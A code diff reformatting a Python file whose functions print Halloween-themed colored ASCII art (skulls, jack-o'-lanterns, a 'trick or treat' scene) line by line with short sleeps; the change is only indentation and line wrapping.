- print(red+'           ::::dP::::::::88888888888::::::::Yb::::     ')
- time.sleep(0.01)
- print(red+'          ::::dP:::::::::Y888888888P:::::::::Yb::::     ')
- time.sleep(0.01)
- print(red+'         ::::d8:::::::::::Y8888888P:::::::::::8b::::     ') 
- time.sleep(0.01)
- print(red+'        .::::88::::::::::::Y88888P::::::::::::88::::.     ')
- time.sleep(0.01)
- print(red+'        :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::      ')
- time.sleep(0.01)
- print(red+'        :::::::Y88888888888P::|::Y88888888888P:::::::     ')
- time.sleep(0.01)
- print(red+'        ::::::::::::::::888:::|:::888::::::::::::::::     ')
- time.sleep(0.01)
- print(red+"        `:::::::::::::::8888888888888b::::::::::::::'   ")
- time.sleep(0.01)
- print(red+'         :::::::::::::::88888888888888::::::::::::::   ')
- time.sleep(0.01)
- print(red+'          :::::::::::::d88888888888888:::::::::::::   ')
- time.sleep(0.01)
- print(red+'           ::::::::::::88::88::88:::88::::::::::::  ')
- time.sleep(0.01)
- print(red+"            `::::::::::88::88::88:::88::::::::::'  ")
- time.sleep(0.01)
- print(red+"              `::::::::88::88::P::::88::::::::'  ")
- time.sleep(0.01)
- print(red+"                `::::::88::88:::::::88::::::'  ")
- time.sleep(0.01)
- print(red+"                   ``:::::::::::::::::::''  ")
- time.sleep(0.01)
- print(red+"                        ``:::::::::''  ")
- time.sleep(0.01)
+
+  time.sleep(0.01)
+  print(red + '                        ..:::::::::..       ')
+  time.sleep(0.01)
+  print(red + '                    ..:::aad8888888baa:::..      ')
+  time.sleep(0.01)
+  print(red + '                .::::d:?88888888888?::8b::::.      ')
+  time.sleep(0.01)
+  print(red + '              .:::d8888:?88888888??a888888b:::.      ')
+  time.sleep(0.01)
+  print(red + '            .:::d8888888a8888888aa8888888888b:::.      ')
+  time.sleep(0.01)
+  print(red + '           ::::dP::::::::88888888888::::::::Yb::::     ')
+  time.sleep(0.01)
+  print(red + '          ::::dP:::::::::Y888888888P:::::::::Yb::::     ')
+  time.sleep(0.01)
+  print(red + '         ::::d8:::::::::::Y8888888P:::::::::::8b::::     ')
+  time.sleep(0.01)
+  print(red + '        .::::88::::::::::::Y88888P::::::::::::88::::.     ')
+  time.sleep(0.01)
+  print(red + '        :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::      ')
+  time.sleep(0.01)
+  print(red + '        :::::::Y88888888888P::|::Y88888888888P:::::::     ')
+  time.sleep(0.01)
+  print(red + '        ::::::::::::::::888:::|:::888::::::::::::::::     ')
+  time.sleep(0.01)
+  print(red + "        `:::::::::::::::8888888888888b::::::::::::::'   ")
+  time.sleep(0.01)
+  print(red + '         :::::::::::::::88888888888888::::::::::::::   ')
+  time.sleep(0.01)
+  print(red + '          :::::::::::::d88888888888888:::::::::::::   ')
+  time.sleep(0.01)
+  print(red + '           ::::::::::::88::88::88:::88::::::::::::  ')
+  time.sleep(0.01)
+  print(red + "            `::::::::::88::88::88:::88::::::::::'  ")
+  time.sleep(0.01)
+  print(red + "              `::::::::88::88::P::::88::::::::'  ")
+  time.sleep(0.01)
+  print(red + "                `::::::88::88:::::::88::::::'  ")
+  time.sleep(0.01)
+  print(red + "                   ``:::::::::::::::::::''  ")
+  time.sleep(0.01)
+  print(red + "                        ``:::::::::''  ")
+  time.sleep(0.01)
+
+
 def sem_10():
- 
- time.sleep(0.01)
- print(cyan +"""                     ,                """)
- time.sleep(0.01)
- print(cyan +"""                     |'.             , """)
- time.sleep(0.01)
- print(cyan +"""                     |  '-._        / ) """)
- time.sleep(0.01)
- print(cyan +"""                   .'  .._  ',     /_'-,  """)
- time.sleep(0.01)
- print(cyan +"""                  '   /  _'.'_\   /._)')  """)
- time.sleep(0.01)
- print(red +"""                 :   /  '_' '_'  /  _.' """)
- time.sleep(0.01)
- print(red +"""                 |E |   |Q| |Q| /   / """)
- time.sleep(0.01)
- print(red +"""               .'  _\  '-' '-'    / """)
- time.sleep(0.01)
- print(red +"""              .'--.(S     ,__` )  /    """)
- time.sleep(0.01) 
- print(red +"""                    '-.     _.'  /      """)
- time.sleep(0.01)
- print(green +"""                  __.--'----(   /   """)  
- time.sleep(0.01)
- print(green +"""              _.-'     :   __\ / """)
- time.sleep(0.01)
- print(green +"""             (      __.' :'  :Y """)
- time.sleep(0.01)
- print(green +"""              '.   '._,  :   :|        """)
- time.sleep(0.01)
- print(cyan +"""                '.     ) :.__:|      """)
- time.sleep(0.01)
- print(cyan +"""                  \    \______/ """)
- time.sleep(0.01)
- print(cyan +"""                   '._D/_Z____]    """)                                       
- time.sleep(0.01)
+
+  time.sleep(0.01)
+  print(cyan + """                     ,                """)
+  time.sleep(0.01)
+  print(cyan + """                     |'.             , """)
+  time.sleep(0.01)
+  print(cyan + """                     |  '-._        / ) """)
+  time.sleep(0.01)
+  print(cyan + """                   .'  .._  ',     /_'-,  """)
+  time.sleep(0.01)
+  print(cyan + """                  '   /  _'.'_\   /._)')  """)
+  time.sleep(0.01)
+  print(red + """                 :   /  '_' '_'  /  _.' """)
+  time.sleep(0.01)
+  print(red + """                 |E |   |Q| |Q| /   / """)
+  time.sleep(0.01)
+  print(red + """               .'  _\  '-' '-'    / """)
+  time.sleep(0.01)
+  print(red + """              .'--.(S     ,__` )  /    """)
+  time.sleep(0.01)
+  print(red + """                    '-.     _.'  /      """)
+  time.sleep(0.01)
+  print(green + """                  __.--'----(   /   """)
+  time.sleep(0.01)
+  print(green + """              _.-'     :   __\ / """)
+  time.sleep(0.01)
+  print(green + """             (      __.' :'  :Y """)
+  time.sleep(0.01)
+  print(green + """              '.   '._,  :   :|        """)
+  time.sleep(0.01)
+  print(cyan + """                '.     ) :.__:|      """)
+  time.sleep(0.01)
+  print(cyan + """                  \    \______/ """)
+  time.sleep(0.01)
+  print(cyan + """                   '._D/_Z____]    """)
+  time.sleep(0.01)
+
+
 def sem_11():
- 
- time.sleep(0.01)
- print(cyan +"""                            _...----.                """)
- time.sleep(0.01)
- print(cyan +"""                          .'    .-'`                """)
- time.sleep(0.01)
- print(cyan +"""                        ,''--..;                 """)
- time.sleep(0.01)
- print(cyan +"""                       /       |                  """)
- time.sleep(0.01)
- print(cyan +"""               _______/________|_______               """)
- time.sleep(0.01)
- print(cyan +"""              `-----/// _\  /_ \\\-----`                  """)
- time.sleep(0.01)
- print(cyan +"""                .---./ / o\/o \ \.---.                  """)
- time.sleep(0.01)
- print(cyan +"""               <(_ /// \__/\__/ \\\ _)>   _.---.                  """)
- time.sleep(0.01)
- print(cyan +"""                '-. //    oo    \\ .-'  .'   .__`\                  """)
- time.sleep(0.01)
- print(cyan +"""             o    /// __..--..__ \\\   /       \`\|                  """)
- time.sleep(0.01)
- print(cyan +"""          o-'*'-o //| '\/\/\/\/' |\\  /         ; '                  """)
- time.sleep(0.01)
- print(cyan +"""          \*\|/*/   ;--. """"  .-;   |   _   _  |                  """)
- time.sleep(0.01)
- print(cyan +"""         .-'---'-. / \|||-....(|||`\ |  (o) (o) |                  """)
- time.sleep(0.01)
- print(cyan +"""        /         \ /\           /\|/           |                  """)
- time.sleep(0.01)
- print(cyan +"""        |  .---,  |/  \         /  ;  '         |                  """)
- time.sleep(0.01)
- print(cyan +"""        | / e e \ |    '.     .'   |   '-.       \                  """)
- time.sleep(0.01)
- print(cyan +"""         \|  ^  |/       '---'     |              \_                  """)
- time.sleep(0.01)
- print(cyan +"""         ()._-_.()     T R I C K   |     .._.----/` \                  """)
- time.sleep(0.01)
- print(cyan +"""        ,/\'._.'/\. '  .           |    /   ``"-/||\ \                  """)
- time.sleep(0.01)
- print(cyan +"""       / \/     \/ \     O R       |   |            `7,                  """)
- time.sleep(0.01)
- print(cyan +"""      |  ^^_____^^  |              | . /// _          |                  """)
- time.sleep(0.01)
- print(cyan +"""      |oOO`     `OOo|  T R E A T   ; |' / |_) _       |                  """)
- time.sleep(0.01)
- print(cyan +"""      \| '._____.' |/             /  \-|  |_)/ \ _    |                  """)
- time.sleep(0.01)
- print(cyan +"""       |::         | '.__     __,;    `|     \_// \   |                  """)
- time.sleep(0.01)
- print(cyan +"""       |::         |     `````   |     |        \_/  ;                  """)
- time.sleep(0.01)
- print(cyan +"""       |::         |             |      \           /                  """)
- time.sleep(0.01)
- print(cyan +"""       \::.        /_____________|       ``'--..___/                  """)
- time.sleep(0.01)
- print(cyan +"""        '._______.' '-|   |   |-'                 |                  """)
- time.sleep(0.01)
- print(cyan +"""          |_ | _|     |   |   |               __.-;                  """)
- time.sleep(0.01)
- print(cyan +"""          \  |  /     /-._|_.-\                    \                  """)
- time.sleep(0.01)
- print(cyan +"""           \_|_/     /`'-.|.-'`\                   /                  """)
- time.sleep(0.01)
- print(cyan +"""     jgs  /--T--\   /    .'.    \'-..____.---''''``                  """)
- time.sleep(0.01)
- print(cyan +"""         (__/ \__)  \____/  \___/                  """)
- time.sleep(0.01)
+
+  time.sleep(0.01)
+  print(cyan + """                            _...----.                """)
+  time.sleep(0.01)
+  print(cyan + """                          .'    .-'`                """)
+  time.sleep(0.01)
+  print(cyan + """                        ,''--..;                 """)
+  time.sleep(0.01)
+  print(cyan + """                       /       |                  """)
+  time.sleep(0.01)
+  print(cyan + """               _______/________|_______               """)
+  time.sleep(0.01)
+  print(cyan +
+        """              `-----/// _\  /_ \\\-----`                  """)
+  time.sleep(0.01)
+  print(cyan + """                .---./ / o\/o \ \.---.                  """)
+  time.sleep(0.01)
+  print(
+      cyan +
+      """               <(_ /// \__/\__/ \\\ _)>   _.---.                  """)
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                '-. //    oo    \\ .-'  .'   .__`\                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """             o    /// __..--..__ \\\   /       \`\|                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """          o-'*'-o //| '\/\/\/\/' |\\  /         ; '                  """
+  )
+  time.sleep(0.01)
+  print(cyan + """          \*\|/*/   ;--. """
+        "  .-;   |   _   _  |                  "
+        "")
+  time.sleep(0.01)
+  print(
+      cyan +
+      """         .-'---'-. / \|||-....(|||`\ |  (o) (o) |                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """        /         \ /\           /\|/           |                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """        |  .---,  |/  \         /  ;  '         |                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """        | / e e \ |    '.     .'   |   '-.       \                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """         \|  ^  |/       '---'     |              \_                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """         ()._-_.()     T R I C K   |     .._.----/` \                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """        ,/\'._.'/\. '  .           |    /   ``"-/||\ \                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """       / \/     \/ \     O R       |   |            `7,                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """      |  ^^_____^^  |              | . /// _          |                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """      |oOO`     `OOo|  T R E A T   ; |' / |_) _       |                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """      \| '._____.' |/             /  \-|  |_)/ \ _    |                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """       |::         | '.__     __,;    `|     \_// \   |                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """       |::         |     `````   |     |        \_/  ;                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """       |::         |             |      \           /                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """       \::.        /_____________|       ``'--..___/                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """        '._______.' '-|   |   |-'                 |                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """          |_ | _|     |   |   |               __.-;                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """          \  |  /     /-._|_.-\                    \                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """           \_|_/     /`'-.|.-'`\                   /                  """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """     jgs  /--T--\   /    .'.    \'-..____.---''''``                  """
+  )
+  time.sleep(0.01)
+  print(cyan + """         (__/ \__)  \____/  \___/                  """)
+  time.sleep(0.01)
+
+
 def sem_12():
- 
- time.sleep(0.01)
- print(cyan +"""                             __                """)
- time.sleep(0.01)
- print(cyan +"""                            |  |              """)
- time.sleep(0.01)
- print(cyan +"""                            |  |              """)
- time.sleep(0.01)
- print(cyan +"""                        ___/____\___              """)
- time.sleep(0.01)
- print(cyan +"""                   _- ~              ~  _              """)
- time.sleep(0.01)
- print(cyan +"""                - ~                      ~ -_              """)
- time.sleep(0.01)
- print(cyan +"""              -                               _              """)
- time.sleep(0.01)
- print(cyan +"""            -         /\            /\          _              """)
- time.sleep(0.01)
- print(cyan +"""           -         / *\          / *\          _              """)
- time.sleep(0.01)
- print(cyan +"""          _         /____\        /____\          _              """)
- time.sleep(0.01)
- print(cyan +"""          _                  /\                   _              """)
- time.sleep(0.01)
- print(cyan +"""          _                 /__\                  _              """)
- time.sleep(0.01)
- print(cyan +"""          _      |\                      /|       _              """)
- time.sleep(0.01)
- print(cyan +"""           -     \ `\/\/\/\/\/\/\/\/\/\/' /      _              """)
- time.sleep(0.01)
- print(cyan +"""            -     \                      /      -              """)
- time.sleep(0.01)
- print(cyan +"""              ~    `\/^\/^\/^\/^\/^\/^\/'      ~              """)
- time.sleep(0.01)
- print(cyan +"""                ~                            -~              """)
- time.sleep(0.01)
- print(cyan +"""                 `--_._._._._._._._._._.._--'              """)
- time.sleep(0.01)
+
+  time.sleep(0.01)
+  print(cyan + """                             __                """)
+  time.sleep(0.01)
+  print(cyan + """                            |  |              """)
+  time.sleep(0.01)
+  print(cyan + """                            |  |              """)
+  time.sleep(0.01)
+  print(cyan + """                        ___/____\___              """)
+  time.sleep(0.01)
+  print(cyan + """                   _- ~              ~  _              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                - ~                      ~ -_              """)
+  time.sleep(0.01)
+  print(cyan +
+        """              -                               _              """)
+  time.sleep(0.01)
+  print(cyan +
+        """            -         /\            /\          _              """)
+  time.sleep(0.01)
+  print(cyan +
+        """           -         / *\          / *\          _              """)
+  time.sleep(0.01)
+  print(
+      cyan +
+      """          _         /____\        /____\          _              """)
+  time.sleep(0.01)
+  print(
+      cyan +
+      """          _                  /\                   _              """)
+  time.sleep(0.01)
+  print(
+      cyan +
+      """          _                 /__\                  _              """)
+  time.sleep(0.01)
+  print(
+      cyan +
+      """          _      |\                      /|       _              """)
+  time.sleep(0.01)
+  print(cyan +
+        """           -     \ `\/\/\/\/\/\/\/\/\/\/' /      _              """)
+  time.sleep(0.01)
+  print(cyan +
+        """            -     \                      /      -              """)
+  time.sleep(0.01)
+  print(cyan +
+        """              ~    `\/^\/^\/^\/^\/^\/^\/'      ~              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                ~                            -~              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                 `--_._._._._._._._._._.._--'              """)
+  time.sleep(0.01)
+
+
 def sem_13():
- 
- time.sleep(0.01)
- print(cyan +"""                            ........              """)
- time.sleep(0.01)
- print(cyan +"""                            ;::;;::;,              """)
- time.sleep(0.01)
- print(cyan +"""                            ;::;;::;;,              """)
- time.sleep(0.01)
- print(cyan +"""                           ;;:::;;::;;,              """)
- time.sleep(0.01)
- print(cyan +"""           .vnmmnv%vnmnv%,.;;;:::;;::;;,  .,vnmnv%vnmnv,              """)
- time.sleep(0.01)
- print(cyan +"""        vnmmmnv%vnmmmnv%vnmmnv%;;;;;;;%nmmmnv%vnmmnv%vnmmnv              """)
- time.sleep(0.01)
- print(cyan +"""      vnmmnv%vnmmmmmnv%vnmmmmmnv%;:;%nmmmmmmnv%vnmmmnv%vnmmmnv              """)
- time.sleep(0.01)
- print(cyan +"""     vnmmnv%vnmmmmmnv%vnmmmmmmmmnv%vnmmmmmmmmnv%vnmmmnv%vnmmmnv              """)
- time.sleep(0.01)
- print(cyan +"""    vnmmnv%vnmmmmmnv%vnmmmmmmmmnv%vnmmmmmmmmmmnv%vnmmmnv%vnmmmnv              """)
- time.sleep(0.01)
- print(cyan +"""   vnmmnv%vnmmmmmnv%vnmm;mmmmmmnv%vnmmmmmmmm;mmnv%vnmmmnv%vnmmmnv,              """)
- time.sleep(0.01)
- print(cyan +"""  vnmmnv%vnmmmmmnv%vnmm;  mmmmmnv%vnmmmmmmm;  mmnv%vnmmmnv%vnmmmnv              """)
- time.sleep(0.01)
- print(cyan +"""  vnmmnv%vnmmmmmnv%vn;;    mmmmnv%vnmmmmmm;;    nv%vnmmmmnv%vnmmmnv              """)
- time.sleep(0.01)
- print(cyan +""" vnmmnv%vnmmmmmmnv%v;;      mmmnv%vnmmmmm;;      v%vnmmmmmnv%vnmmmnv              """)
- time.sleep(0.01)
- print(cyan +""" vnmmnv%vnmmmmmmnv%vnmmmmmmmmm;;       mmmmmmmmmnv%vnmmmmmmnv%vnmmmnv              """)
- time.sleep(0.01)
- print(cyan +""" vnmmnv%vnmmmmmmnv%vnmmmmmmmmmm;;     mmmmmmmmmmnv%vnmmmmmmnv%vnmmmnv              """)
- time.sleep(0.01)
- print(cyan +""" vnmmnv%vnmmmmm nv%vnmmmmmmmmmmnv;, mmmmmmmmmmmmnv%vn;mmmmmnv%vnmmmnv              """)
- time.sleep(0.01)
- print(cyan +""" vnmmnv%vnmmmmm  nv%vnmmmmmmmmmnv%;nmmmmmmmmmmmnv%vn; mmmmmnv%vnmmmnv              """)
- time.sleep(0.01)
- print(cyan +""" `vnmmnv%vnmmmm,  v%vnmmmmmmmmmmnv%vnmmmmmmmmmmnv%v;  mmmmnv%vnnmmnv'              """)
- time.sleep(0.01)
- print(cyan +"""  vnmmnv%vnmmmm;,   %vnmmmmmmmmmnv%vnmmmmmmmmmnv%;    mmmnv%vnmmmmnv              """)
- time.sleep(0.01)
- print(cyan +"""   vnmmnv%vnmmmm;;,   nmmm;,              mmmm;;     mmmnv%vnmmmmnv'              """)
- time.sleep(0.01)
- print(cyan +"""   `vnmmnv%vnmmmmm;;,.         mmnv%v;,            mmmmnv%vnmmmmnv'              """)
- time.sleep(0.01)
- print(cyan +"""    `vnmmnv%vnmmmmmmnv%vnmmmmmmmmnv%vnmmmmmmnv%vnmmmmmnv%vnmmmmnv'              """)
- time.sleep(0.01)
- print(cyan +"""      `vnmvn%vnmmmmmmnv%vnmmmmmmmnv%vnmmmmmnv%vnmmmmmnv%vnmmmnv'              """)
- time.sleep(0.01)
- print(cyan +"""          `vn%vnmmmmmmn%:%vnmnmmmmnv%vnmmmnv%:%vnmmnv%vnmnv'              """)
- time.sleep(0.01)
+
+  time.sleep(0.01)
+  print(cyan + """                            ........              """)
+  time.sleep(0.01)
+  print(cyan + """                            ;::;;::;,              """)
+  time.sleep(0.01)
+  print(cyan + """                            ;::;;::;;,              """)
+  time.sleep(0.01)
+  print(cyan + """                           ;;:::;;::;;,              """)
+  time.sleep(0.01)
+  print(
+      cyan +
+      """           .vnmmnv%vnmnv%,.;;;:::;;::;;,  .,vnmnv%vnmnv,              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """        vnmmmnv%vnmmmnv%vnmmnv%;;;;;;;%nmmmnv%vnmmnv%vnmmnv              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """      vnmmnv%vnmmmmmnv%vnmmmmmnv%;:;%nmmmmmmnv%vnmmmnv%vnmmmnv              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """     vnmmnv%vnmmmmmnv%vnmmmmmmmmnv%vnmmmmmmmmnv%vnmmmnv%vnmmmnv              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """    vnmmnv%vnmmmmmnv%vnmmmmmmmmnv%vnmmmmmmmmmmnv%vnmmmnv%vnmmmnv              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """   vnmmnv%vnmmmmmnv%vnmm;mmmmmmnv%vnmmmmmmmm;mmnv%vnmmmnv%vnmmmnv,              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """  vnmmnv%vnmmmmmnv%vnmm;  mmmmmnv%vnmmmmmmm;  mmnv%vnmmmnv%vnmmmnv              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """  vnmmnv%vnmmmmmnv%vn;;    mmmmnv%vnmmmmmm;;    nv%vnmmmmnv%vnmmmnv              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """ vnmmnv%vnmmmmmmnv%v;;      mmmnv%vnmmmmm;;      v%vnmmmmmnv%vnmmmnv              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """ vnmmnv%vnmmmmmmnv%vnmmmmmmmmm;;       mmmmmmmmmnv%vnmmmmmmnv%vnmmmnv              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """ vnmmnv%vnmmmmmmnv%vnmmmmmmmmmm;;     mmmmmmmmmmnv%vnmmmmmmnv%vnmmmnv              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """ vnmmnv%vnmmmmm nv%vnmmmmmmmmmmnv;, mmmmmmmmmmmmnv%vn;mmmmmnv%vnmmmnv              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """ vnmmnv%vnmmmmm  nv%vnmmmmmmmmmnv%;nmmmmmmmmmmmnv%vn; mmmmmnv%vnmmmnv              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """ `vnmmnv%vnmmmm,  v%vnmmmmmmmmmmnv%vnmmmmmmmmmmnv%v;  mmmmnv%vnnmmnv'              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """  vnmmnv%vnmmmm;,   %vnmmmmmmmmmnv%vnmmmmmmmmmnv%;    mmmnv%vnmmmmnv              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """   vnmmnv%vnmmmm;;,   nmmm;,              mmmm;;     mmmnv%vnmmmmnv'              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """   `vnmmnv%vnmmmmm;;,.         mmnv%v;,            mmmmnv%vnmmmmnv'              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """    `vnmmnv%vnmmmmmmnv%vnmmmmmmmmnv%vnmmmmmmnv%vnmmmmmnv%vnmmmmnv'              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """      `vnmvn%vnmmmmmmnv%vnmmmmmmmnv%vnmmmmmnv%vnmmmmmnv%vnmmmnv'              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """          `vn%vnmmmmmmn%:%vnmnmmmmnv%vnmmmnv%:%vnmmnv%vnmnv'              """
+  )
+  time.sleep(0.01)
+
+
 def sem_14():
- 
- time.sleep(0.01)
- print(cyan +"""                        aa@@@@@@@@@@@@@aa              """)
- time.sleep(0.01)
- print(cyan +"""                     a@@@@@@@@@@@@@@@@@@@@@a              """)
- time.sleep(0.01)
- print(cyan +"""                   a@@@@@@@@@@@@@@@@@@@@@@@@@a              """)
- time.sleep(0.01)
- print(cyan +"""                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""                 @@@@@@@~~~~@@@@@@@@@~~~~@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""                 @@@@@@      @@@@@@@      @@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""                 @@@@@@@aaaa@@@@@@@@@aaaa@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""                 `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'              """)
- time.sleep(0.01)
- print(cyan +"""                  @@@@@@@@~@@@~@@@~@@@~@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""                   @@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""                    @@@@@@@@~@@@~@@@~@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""                     @@@@@@@@@@@@@@@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""                      @@@@@@@@~@@@~@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""                       `@@@@@@@@@@@@@@@@@'              """)
- time.sleep(0.01)
- print(cyan +"""                           ~~@@@@@@@~~              """)
- time.sleep(0.01)
+
+  time.sleep(0.01)
+  print(cyan + """                        aa@@@@@@@@@@@@@aa              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                     a@@@@@@@@@@@@@@@@@@@@@a              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                   a@@@@@@@@@@@@@@@@@@@@@@@@@a              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                 @@@@@@@~~~~@@@@@@@@@~~~~@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                 @@@@@@      @@@@@@@      @@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                 @@@@@@@aaaa@@@@@@@@@aaaa@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                 `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                  @@@@@@@@~@@@~@@@~@@@~@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                   @@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                    @@@@@@@@~@@@~@@@~@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                     @@@@@@@@@@@@@@@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan + """                      @@@@@@@@~@@@~@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan + """                       `@@@@@@@@@@@@@@@@@'              """)
+  time.sleep(0.01)
+  print(cyan + """                           ~~@@@@@@@~~              """)
+  time.sleep(0.01)
+
+
 def sem_15():
- time.sleep(0.01)
- print(cyan +"""                     @@@              """)
- time.sleep(0.01)
- print(cyan +"""                     @@@              """)
- time.sleep(0.01)
- print(cyan +"""                      @@@              """)
- time.sleep(0.01)
- print(cyan +"""                      @@@              """)
- time.sleep(0.01)
- print(cyan +"""              @@@@@@@@@@@@@@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""            @@@@@@@@@@@@@@@@@@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""        @@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""      @@@@@@@@@   @@@@@@@@@@@@@@   @@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""    @@@@@@@@@@     @@@@@@@@@@@@     @@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""   @@@@@@@@@@       @@@@  @@@@       @@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""   @@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""   @@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""   @@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""    @@@@@@@@  @@ @@ @@ @@ @@ @@ @@ @  @@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""      @@@@@@@                        @@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""        @@@@@@  @@ @@ @@ @@ @@ @@ @ @@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""            @@@@@@@@@@@@@@@@@@@@@@@@@@              """)
- time.sleep(0.01)
- print(cyan +"""              @@@@@@@@@@@@@@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan + """                     @@@              """)
+  time.sleep(0.01)
+  print(cyan + """                     @@@              """)
+  time.sleep(0.01)
+  print(cyan + """                      @@@              """)
+  time.sleep(0.01)
+  print(cyan + """                      @@@              """)
+  time.sleep(0.01)
+  print(cyan + """              @@@@@@@@@@@@@@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan + """            @@@@@@@@@@@@@@@@@@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan + """          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
